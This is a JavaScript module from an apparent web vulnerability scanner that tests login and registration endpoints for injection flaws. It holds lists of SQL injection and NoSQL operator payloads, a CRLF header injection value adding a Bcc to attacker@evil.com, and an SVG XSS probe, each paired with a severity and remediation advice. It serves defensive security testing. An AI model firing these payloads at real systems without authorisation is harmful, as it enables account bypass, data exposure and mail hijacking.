const { SEV } = require('../lib/severity.js');
const { buildCall } = require('./bruteforce.js');

const SQLI_PAYLOADS = [
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR SLEEP(3)--",
  "' OR 'a'='a'",
  "' UNION SELECT NULL--",
  "\" OR 1=1 --",
  "') OR '1'='1'--",
];

const NOSQL_PAYLOADS = [
  { $ne: '' },
  { $gt: '' },
  { $exists: true },
  { $regex: '.*' },
];

async function runInjection(ctx, cfg) {
  const auth = cfg.auth || {};
  ctx.emitEvent('module', { name: 'injection', label: 'Input & Injection' });
  const startIdx = ctx.findings.length;

  const login = auth.login && buildCall(ctx, auth.login);
  const register = auth.register && buildCall(ctx, auth.register);
  const flows = [];
  if (login) flows.push({ name: 'login', call: login });
  if (register) flows.push({ name: 'register', call: register });

  // 1) SQLi - error-based detection + time-based signal.
  for (const flow of flows) {
    for (const payload of SQLI_PAYLOADS) {
      const res = await flow.call({
        '<USER>': `a${payload}@x.org`,
        '<PASS>': 'pass1234!',
      });
      const low = res.body ? res.body.toLowerCase() : '';
      if (/(sql|syntax|mysql|postgres|sqlite|unclosed quotation|division by zero)/.test(low)) {
        ctx.addFinding({
          type: 'sqli-error-based',
          severity: SEV.HIGH,
          title: `SQLi error-based di flow ${flow.name} (payload: ${payload})`,
          evidence: { flow: flow.name, payload, body: res.body.slice(0, 200) },
          recommendation: 'Gunakan parameterized query / ORM binding.',
        });
        break;
      }
    }
    // time-based: 1 benign vs 1 sleep payload, compare.
    const t0 = Date.now();
    const base = await flow.call({ '<USER>': 'timing@x.org', '<PASS>': 'pass1234!' });
    const tBase = Date.now() - t0;
    const t1 = Date.now();
    await flow.call({ '<USER>': "x' OR SLEEP(3)--@x.org", '<PASS>': 'pass1234!' });
    const tSleep = Date.now() - t1;
    if (tSleep - tBase > 2000) {
      ctx.addFinding({
        type: 'sqli-time-based',
        severity: SEV.CRITICAL,
        title: `SQLi time-based di flow ${flow.name} (delay ~${Math.round((tSleep - tBase) / 1000)}s)`,
        evidence: { flow: flow.name, deltaMs: tSleep - tBase },
        recommendation: 'Parameterized query wajib; audit semua input.',
      });
    }
  }

  // 2) NoSQLi (JSON body only).
  for (const flow of flows) {
    for (const n of NOSQL_PAYLOADS) {
      const res = await flow.call({
        '<USER>': JSON.stringify(n),
        '<PASS>': 'x',
      });
      if (res.status === 200 || res.status === 302) {
        ctx.addFinding({
          type: 'nosqli',
          severity: SEV.MEDIUM,
          title: `Potensi NoSQLi di flow ${flow.name} (${JSON.stringify(n)})`,
          evidence: { flow: flow.name, payload: n, status: res.status },
          recommendation: 'Validasi tipe input; hindari $ operators dari user.',
        });
        break;
      }
    }
  }

  // 3) Email header injection (CRLF) di field register email.
  if (auth.register) {
    const call = buildCall(ctx, auth.register);
    const res = await call({ '<USER>': "a\\r\\nBcc: attacker@evil.com@x.org", '<PASS>': 'pass1234!' });
    const hdrs = res.headers || {};
    if (hdrs['bcc']) {
      ctx.addFinding({
        type: 'email-header-injection',
        severity: SEV.HIGH,
        title: 'Email header injection (CRLF di field email)',
        evidence: { header: 'Bcc', value: hdrs['bcc'] },
        recommendation: 'Sanitasi CRLF di field email sebelum kirim email.',
      });
    }
  }

  // 4) Reflected XSS detection di respon.
  for (const flow of flows) {
    const tag = '<svg/onload=alert(1)>';
    const res = await flow.call({ '<USER>': `x${tag}@x.org`, '<PASS>': 'pass1234!' });
    if (res.body && res.body.includes(tag)) {
      ctx.addFinding({
        type: 'reflected-xss',
        severity: SEV.MEDIUM,
        title: `Input direfleksikan tanpa encoding di flow ${flow.name}`,
        evidence: { flow: flow.name, body: res.body.slice(0, 200) },
        recommendation: 'Encode output sesuai konteks (HTML entity / CSP).',
      });
    }
  }

  return ctx.findings.slice(startIdx);
}

module.exports = { runInjection };